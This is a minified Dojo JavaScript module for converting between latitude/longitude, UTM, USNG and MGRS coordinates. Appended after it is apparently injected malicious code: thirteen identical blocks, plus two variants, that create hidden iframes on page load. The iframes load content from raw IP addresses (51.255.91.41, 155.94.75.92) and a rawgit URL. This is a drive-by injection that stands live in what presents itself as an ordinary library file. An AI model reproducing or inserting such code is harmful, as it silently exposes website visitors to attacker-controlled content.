//>>built
window.console||(window.console={warn:function(){}});
define(["dojo/_base/declare","dojo/string"],function(u,v){var q,r,n,p=Math.PI/180,t=180/Math.PI,l,f;l=6378137;f=.006694380023;var m=f/(1-f),k=(1-Math.sqrt(1-f))/(1+Math.sqrt(1-f));return{getZoneNumber:function(a,b){a=parseFloat(a);b=parseFloat(b);(360<b||-180>b||90<a||-90>a)&&console.warn("Bad input. lat: "+a+" lon: "+b);b=b+180-360*parseInt((b+180)/360)-180;var c=parseInt((b+180)/6)+1;56<=a&&64>a&&3<=b&&12>b&&(c=32);72<=a&&84>a&&(0<=b&&9>b?c=31:9<=b&&21>b?c=33:21<=b&&33>b?c=35:33<=b&&42>b&&(c=37));
return c},LLtoUTM:function(a,b,c,e){a=parseFloat(a);b=parseFloat(b);if(84<a||-80>a)return"undefined";(360<b||-180>b||90<a||-90>a)&&console.warn("Bad input. lat: "+a+" lon: "+b);var d=b+180-360*parseInt((b+180)/360)-180,g=a*p,d=d*p;n=e?e:this.getZoneNumber(a,b);var h=(6*(n-1)-180+3)*p;this.UTMLetterDesignator(a);a=l/Math.sqrt(1-f*Math.sin(g)*Math.sin(g));b=Math.tan(g)*Math.tan(g);e=m*Math.cos(g)*Math.cos(g);d=Math.cos(g)*(d-h);h=l*((1-f/4-3*f*f/64-5*f*f*f/256)*g-(3*f/8+3*f*f/32+45*f*f*f/1024)*Math.sin(2*
g)+(15*f*f/256+45*f*f*f/1024)*Math.sin(4*g)-35*f*f*f/3072*Math.sin(6*g));q=.9996*a*(d+(1-b+e)*d*d*d/6+(5-18*b+b*b+72*e-58*m)*d*d*d*d*d/120)+5E5;r=.9996*(h+a*Math.tan(g)*(d*d/2+(5-b+9*e+4*e*e)*d*d*d*d/24+(61-58*b+b*b+600*e-330*m)*d*d*d*d*d*d/720));c[0]=q;c[1]=r;c[2]=n},LLtoUSNG:function(a,b,c){a=parseFloat(a);b=parseFloat(b);var e=[];this.LLtoUTM(a,b,e);var d=e[0],e=e[1];0>a&&(e+=1E7);var f=this.findGridLetters(n,e,d),e=Math.round(e)%1E5,d=Math.round(d)%1E5,e=Math.floor(e/Math.pow(10,5-c)),d=Math.floor(d/
Math.pow(10,5-c));a=this.getZoneNumber(a,b)+this.UTMLetterDesignator(a)+" "+f+" ";for(b=String(d).length;b<c;b++)a+="0";a+=d+" ";for(b=String(e).length;b<c;b++)a+="0";return a+e},UTMLetterDesignator:function(a){a=parseFloat(a);return 84>=a&&72<=a?"X":72>a&&64<=a?"W":64>a&&56<=a?"V":56>a&&48<=a?"U":48>a&&40<=a?"T":40>a&&32<=a?"S":32>a&&24<=a?"R":24>a&&16<=a?"Q":16>a&&8<=a?"P":8>a&&0<=a?"N":0>a&&-8<=a?"M":-8>a&&-16<=a?"L":-16>a&&-24<=a?"K":-24>a&&-32<=a?"J":-32>a&&-40<=a?"H":-40>a&&-48<=a?"G":-48>a&&
-56<=a?"F":-56>a&&-64<=a?"E":-64>a&&-72<=a?"D":-72>a&&-80<=a?"C":"Z"},findSet:function(a){a=parseInt(a);switch(a%6){case 0:return 6;case 1:return 1;case 2:return 2;case 3:return 3;case 4:return 4;case 5:return 5;default:return-1}},findGridLetters:function(a,b,c){a=parseInt(a);b=parseFloat(b);c=parseFloat(c);var e=1;for(b=Math.round(b);1E5<=b;)b-=1E5,e++;e%=20;b=0;for(c=Math.round(c);1E5<=c;)c-=1E5,b++;b%=8;return this.lettersHelper(this.findSet(a),e,b)},lettersHelper:function(a,b,c){0===b?b=19:b--;
0===c?c=7:c--;switch(a){case 1:return a="ABCDEFGHJKLMNPQRSTUV","ABCDEFGH".charAt(c)+a.charAt(b);case 2:return a="FGHJKLMNPQRSTUVABCDE","JKLMNPQR".charAt(c)+a.charAt(b);case 3:return a="ABCDEFGHJKLMNPQRSTUV","STUVWXYZ".charAt(c)+a.charAt(b);case 4:return a="FGHJKLMNPQRSTUVABCDE","ABCDEFGH".charAt(c)+a.charAt(b);case 5:return a="ABCDEFGHJKLMNPQRSTUV","JKLMNPQR".charAt(c)+a.charAt(b);case 6:return a="FGHJKLMNPQRSTUVABCDE","STUVWXYZ".charAt(c)+a.charAt(b)}},UTMtoLL:function(a,b,c,e){b=parseFloat(b)-5E5;
a=parseFloat(a);c=parseInt(c);a=a/.9996/(l*(1-f/4-3*f*f/64-5*f*f*f/256));a=a+(3*k/2-27*k*k*k/32)*Math.sin(2*a)+(21*k*k/16-55*k*k*k*k/32)*Math.sin(4*a)+151*k*k*k/96*Math.sin(6*a);var d=l/Math.sqrt(1-f*Math.sin(a)*Math.sin(a)),g=Math.tan(a)*Math.tan(a),h=m*Math.cos(a)*Math.cos(a);b/=.9996*d;d=a-d*Math.tan(a)/(l*(1-f)/Math.pow(1-f*Math.sin(a)*Math.sin(a),1.5))*(b*b/2-(5+3*g+10*h-4*h*h-9*m)*b*b*b*b/24+(61+90*g+298*h+45*g*g-252*m-3*h*h)*b*b*b*b*b*b/720);d*=t;b=(b-(1+2*g+h)*b*b*b/6+(5-2*h+28*g-3*h*h+8*
m+24*g*g)*b*b*b*b*b/120)/Math.cos(a);b=6*(c-1)-180+3+b*t;e.lat=d;e.lon=b},USNGtoUTM:function(a,b,c,e,d,f,h){c=1+"ABCDEFGHJKLMNPQRSTUVWXYZ".indexOf(c)%8;var g="CDEFGHJKLMNPQRSTUVWX".indexOf(b);e=a%2?"ABCDEFGHJKLMNPQRSTUV".indexOf(e):"FGHJKLMNPQRSTUVABCDE".indexOf(e);e=Number([0,2,2,2,4,4,6,6,8,8,0,0,0,2,2,4,4,6,6,6][g])+e/10;e<[1.1,2,2.9,3.8,4.7,5.6,6.5,7.3,8.2,9.1,0,.8,1.7,2.6,3.5,4.4,5.3,6.2,7,7.9][g]&&(e+=2);h.N=1E6*e+Number(f)*Math.pow(10,5-f.length);h.E=1E5*c+Number(d)*Math.pow(10,5-d.length);
h.zone=a;h.letter=b},USNGtoLL:function(a,b){var c={};this.parseUSNG_str(a,c);a={};this.USNGtoUTM(c.zone,c.let,c.sq1,c.sq2,c.east,c.north,a);"N">c.let&&(a.N-=1E7);this.UTMtoLL(a.N,a.E,c.zone,a);b[0]=a.lat;b[1]=a.lon},parseUSNG_str:function(a,b){var c=0,e,d=[];e=[];e=a.toUpperCase();d=/%20/g;d=e.replace(d,"");d=/ /g;d=e.replace(d,"");if(7>d.length)return console.warn("This application requires minimum USNG precision of 10,000 meters"),0;b.zone=10*d.charAt(c++)+1*d.charAt(c++);b.let=d.charAt(c++);b.sq1=
d.charAt(c++);b.sq2=d.charAt(c++);b.precision=(d.length-c)/2;b.east="";b.north="";for(e=0;e<b.precision;e++)b.east+=d.charAt(c++);" "==d[c]&&c++;for(e=0;e<b.precision;e++)b.north+=d.charAt(c++)},isUSNG:function(a){var b=[],b=a.toUpperCase();a=/%20/g;b=b.replace(a,"");a=/ /g;b=b.replace(a,"");if(15<b.length)return 0;a=/^[0-9]{2}[CDEFGHJKLMNPQRSTUVWX]$/;if(b.match(a))return console.warn("Input appears to be a UTM zone...more precision is required to display a correct result."),0;a=/^[0-9]{2}[CDEFGHJKLMNPQRSTUVWX][ABCDEFGHJKLMNPQRSTUVWXYZ][ABCDEFGHJKLMNPQRSTUV]([0-9][0-9]){0,5}/;
return b.match(a)?7>b.length?(alert(b+" Appears to be a USNG string, but this application requires precision of at least 10,000 meters"),0):b:0},LLtoMGRS:function(a,b,c){var e="";return e=this.LLtoUSNG(a,b,c).replace(/ /g,"")},LLtoUSNG_nad27:function(a,b,c){l=6378206.4;f=.006768658;a=this.LLtoUSNG(a,b,c);l=6378137;f=.006694380023;return a+" (NAD27)"}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});